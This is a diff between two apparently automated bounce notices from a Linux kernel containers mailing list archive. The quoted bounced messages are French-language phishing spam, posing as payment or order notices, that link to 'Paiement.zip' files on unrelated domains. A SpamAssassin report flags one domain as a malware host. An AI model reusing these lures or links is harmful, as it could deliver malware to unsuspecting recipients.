@@ -1,10 +1,9 @@
-From: Mail Delivery System <Mailer-Daemon-a9Uv5FTCywCqRXKm0uHZjQ@public.gmane.org>
-Subject: Mail delivery failed: returning message to sender
-Date: Wed, 25 Mar 2015 10:22:45 +0100
-Message-ID: <E1YahWP-00035J-Gl@mailhub5.mail.easynet.fr>
+From: MAILER-DAEMON-+NbaIjSFD8nd8Zgiw/MPxQ@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Wed, 25 Mar 2015 10:06:29 -0700 (PDT)
+Message-ID: <20150325170629.E9A984083237@c2mailgw11.amadis.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============3977726543645766837=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -18,69 +17,89 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This message was created automatically by mail delivery software.
+This is a MIME-encapsulated message.
 
-A message that you sent could not be delivered to one or more of its
-recipients. This is a permanent error. The following address(es) failed:
+--===============3977726543645766837==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="900004082E6F.1427303189/c2mailgw11.amadis.com"
 
-  bbonzi.password-1kXtHpul8t1GWvitb5QawA@public.gmane.org
-    mailbox is full: retry timeout exceeded
+This is a MIME-encapsulated message.
 
------- This is a copy of the message, including all the headers. ------
+--900004082E6F.1427303189/c2mailgw11.amadis.com
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
 
-Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from [212.180.1.20] (helo=mx6.easynet.fr)
-	by mailhub5.mail.easynet.fr with esmtp (Exim 4.63)
-	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1YahWO-00035F-To
-	for bbonzi.password-1kXtHpul8t1GWvitb5QawA@public.gmane.org; Wed, 25 Mar 2015 10:22:44 +0100
-Received: from d126.netdc.pl ([185.25.150.143] helo=d110.netdc.pl)
-	by mx6.easynet.fr with esmtp (Exim 4.72)
-	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1YahWM-0003F4-Td
-	for bbonzi.password-1kXtHpul8t1GWvitb5QawA@public.gmane.org; Wed, 25 Mar 2015 10:22:44 +0100
-Received: from d110.netdc.pl (RTF-06-71 [185.25.150.143]) by d110.netdc.pl (mailer) with SMTP id xEsjLsBbHxGW for <bbonzi.password-1kXtHpul8t1GWvitb5QawA@public.gmane.org>; Wed, 25 Mar 2015 10:22:40 +0100
-Date: Wed, 25 Mar 2015 10:22:40 +0100
-From: "Elenore" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Message-ID: <09086320.40038127315707-fdlNZucA2fUI3quFi6fKwA@public.gmane.org>
-To: <bbonzi.password-1kXtHpul8t1GWvitb5QawA@public.gmane.org>
-Subject: informazioni
+This is the mail system at host c2mailgw11.amadis.com.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please send mail to postmaster.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<loktji-3242L466az9QFI55V6+gNQ@public.gmane.org>: host m2w-in1.ctmail.com[74.202.142.24] said: 550 5.1.1
+    <loktji-3242L466az9QFI55V6+gNQ@public.gmane.org> is not a valid mailbox (in reply to RCPT TO command)
+
+--900004082E6F.1427303189/c2mailgw11.amadis.com
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; c2mailgw11.amadis.com
+X-Postfix-Queue-ID: 900004082E6F
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Wed, 25 Mar 2015 10:06:17 -0700 (PDT)
+
+Final-Recipient: rfc822; loktji-3242L466az9QFI55V6+gNQ@public.gmane.org
+Original-Recipient: rfc822;loktji-3242L466az9QFI55V6+gNQ@public.gmane.org
+Action: failed
+Status: 5.1.1
+Remote-MTA: dns; m2w-in1.ctmail.com
+Diagnostic-Code: smtp; 550 5.1.1 <loktji-3242L466az9QFI55V6+gNQ@public.gmane.org> is not a valid mailbox
+
+--900004082E6F.1427303189/c2mailgw11.amadis.com
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from server.wealthcampus.com (unknown [162.144.63.133])
+	by c2mailgw11.amadis.com (Postfix) with ESMTP id 2F2D74080A68
+	for <loktji-3242L466az9QFI55V6+gNQ@public.gmane.org>; Wed, 25 Mar 2015 10:06:17 -0700 (PDT)
+Received: from server.wealthcampus.com (VFz-49-48 [162.144.63.133]) by server.wealthcampus.com (mailer) with SMTP id pBAYCkLGs7by for <loktji-3242L466az9QFI55V6+gNQ@public.gmane.org>; Wed, 25 Mar 2015 17:06:16 +0000
+Date: Wed, 25 Mar 2015 17:06:16 +0000
+From: "Vera" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Message-ID: <15593534.09503341557730-q+ubOk6Rbn8Cr+FVUJbHnPWUG3fh59Ew@public.gmane.org>
+To: <loktji-3242L466az9QFI55V6+gNQ@public.gmane.org>
+Subject: Fwd: Informazioni 151089
 MIME-Version: 1.0
-Content-type: text/plain; charset=us-ascii 
-Content-Transfer-Encoding: 8bit
-X-Spam-Score: 7.4
-X-Spam-Report: SpamAssassin 3.3.1 (2010-03-16) on lando.easynet.fr
- 
- Content analysis details:   (7.4 points, 8.0 required)
- 
- DCC result     : lando.easynet.fr 1040; Body=1 Fuz1=1
- RBL result     : <dns:143.150.25.185.bb.barracudacentral.org> [127.0.0.2]
- <dns:lists.linux-foundation.org> [140.211.169.12]
- <dns:lists.linux-foundation.org?type=MX> [10 smtp1.linuxfoundation.org., 15 smtp2.linuxfoundation.org.]
- <dns:143.150.25.185.psbl.surriel.com> [127.0.0.2]
- AWL result    : 
- Bayes result  : 0.5
-  pts rule name              description
- ---- ---------------------- -------------------------------------------
-  2.7 RCVD_IN_PSBL           RBL: Received via a relay in PSBL
-                             [185.25.150.143 listed in psbl.surriel.com]
-  1.3 URIBL_MW_SURBL         Contains a Malware Domain or IP listed in the MW SURBL
-                              blocklist
-                             [URIs: rokus-tgy.hu]
-  1.6 RCVD_IN_BRBL_LASTEXT   RBL: RCVD_IN_BRBL_LASTEXT
-                             [185.25.150.143 listed in bb.barracudacentral.org]
-  0.9 SPF_HELO_SOFTFAIL      SPF: HELO does not match SPF record (softfail)
-  0.9 SPF_FAIL               SPF: sender does not match SPF record (fail)
- [SPF failed: Please see http://www.openspf.org/Why?s=mfrom;id=containers%40lists.linux-foundation.org;ip=185.25.150.143;r=lando.easynet.fr]
-X-Spam-Level: +++++++
+Content-type: text/plain; charset= iso-8859-1
+X-CTASD-RefID: str=0001.0A090202.5512EB0F.00E6,ss=1,re=0.001,recu=0.000,reip=0.000,cl=1,cld=1,fgs=0
+X-CTASD-IP: 162.144.63.133
+X-CTASD-Sender: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+x-ctasd: uncategorized
+x-ctasd-vod: uncategorized
+x-ctasd-station: 
+Content-Transfer-Encoding: quoted-printable
+
+Desole pour le delais, je suis actuellement sur de nouveaux projet
+http://pigeoteknik.com.tr/Paiement.zip?id_5h1O9aP3_user_=3Dloktji@excite.=
+fr
 
 
 
-Cher client, bbonzi.password-1kXtHpul8t1GWvitb5QawA@public.gmane.org
+--900004082E6F.1427303189/c2mailgw11.amadis.com--
 
-Commande des statistiques dans le profil, vous pouvez voir au adresse:
-http://www.rokus-tgy.hu/Paiement.zip?id_4pyAk03QMHT_user_=bbonzi.password-1kXtHpul8t1GWvitb5QawA@public.gmane.org
+--===============3977726543645766837==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
---
-Nous serons heureux de cooperer a l'avenir
-Tel./Fax.: +33 (177) 581 03 45.               
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============3977726543645766837==--
